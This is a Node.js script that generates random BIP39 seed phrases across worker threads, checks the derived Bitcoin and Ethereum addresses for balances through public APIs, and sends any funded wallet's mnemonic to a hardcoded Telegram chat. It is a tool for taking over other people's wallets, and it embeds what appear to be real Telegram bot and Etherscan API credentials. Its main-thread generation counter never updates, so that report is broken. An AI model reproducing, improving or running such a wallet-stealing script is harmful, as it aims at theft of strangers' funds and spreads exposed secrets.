const bip39 = require('bip39');
const { HDNode, networks } = require('bitcoinjs-lib');
const ethers = require('ethers');
const axios = require('axios');
const { Worker, isMainThread, parentPort } = require('worker_threads');
const TelegramBot = require('node-telegram-bot-api');

const TELEGRAM_BOT_TOKEN = '6600045884:AAHCVIaUjbi9a0GbiQpcOEJcpxK-g0iqQsU';
const TELEGRAM_CHAT_ID = '737206288';
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

const BTC_API = 'https://blockchain.info/q/addressbalance/';
const ETH_API = 'https://api.etherscan.io/api?module=account&action=balance&address=';
const ETH_API_KEY = '75722298119549be9f2e368591eb0a7b';

const MAX_WORKERS = 4;
let totalGenerated = 0;

async function getBTCBalance(address) {
    try {
        const response = await axios.get(`${BTC_API}${address}?confirmations=0`);
        return parseFloat(response.data) / 1e8; // Convert Satoshis to BTC
    } catch (error) {
        return 0;
    }
}

async function getETHBalance(address) {
    try {
        const response = await axios.get(`${ETH_API}${address}&apikey=${ETH_API_KEY}`);
        return parseFloat(response.data.result) / 1e18; // Convert Wei to ETH
    } catch (error) {
        return 0;
    }
}

function generateWallet() {
    const mnemonic = bip39.generateMnemonic(128); // 12 words
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const btcNode = HDNode.fromSeedBuffer(seed, networks.bitcoin);
    const btcAddress = btcNode.derivePath("m/44'/0'/0'/0/0").getAddress();
    
    const ethWallet = ethers.Wallet.fromMnemonic(mnemonic);
    const ethAddress = ethWallet.address;
    
    return { mnemonic, btcAddress, ethAddress };
}

async function checkWallet() {
    const { mnemonic, btcAddress, ethAddress } = generateWallet();
    const btcBalance = await getBTCBalance(btcAddress);
    const ethBalance = await getETHBalance(ethAddress);

    totalGenerated++;
    if (btcBalance > 0.000000001 || ethBalance > 0.000000001) {
        const message = `🔹 Wallet Found!\n🔑 Mnemonic: ${mnemonic}\n\n💰 BTC: ${btcBalance}\n📍 BTC Address: ${btcAddress}\n\n💰 ETH: ${ethBalance}\n📍 ETH Address: ${ethAddress}`;
        bot.sendMessage(TELEGRAM_CHAT_ID, message);
    }
}

if (isMainThread) {
    for (let i = 0; i < MAX_WORKERS; i++) {
        const worker = new Worker(__filename);
        worker.on('message', msg => console.log(msg));
    }

    setInterval(() => {
        bot.sendMessage(TELEGRAM_CHAT_ID, `🔥 Total Generations: ${totalGenerated}`);
    }, 300000); // Every 5 minutes
} else {
    setInterval(checkWallet, 500);
}
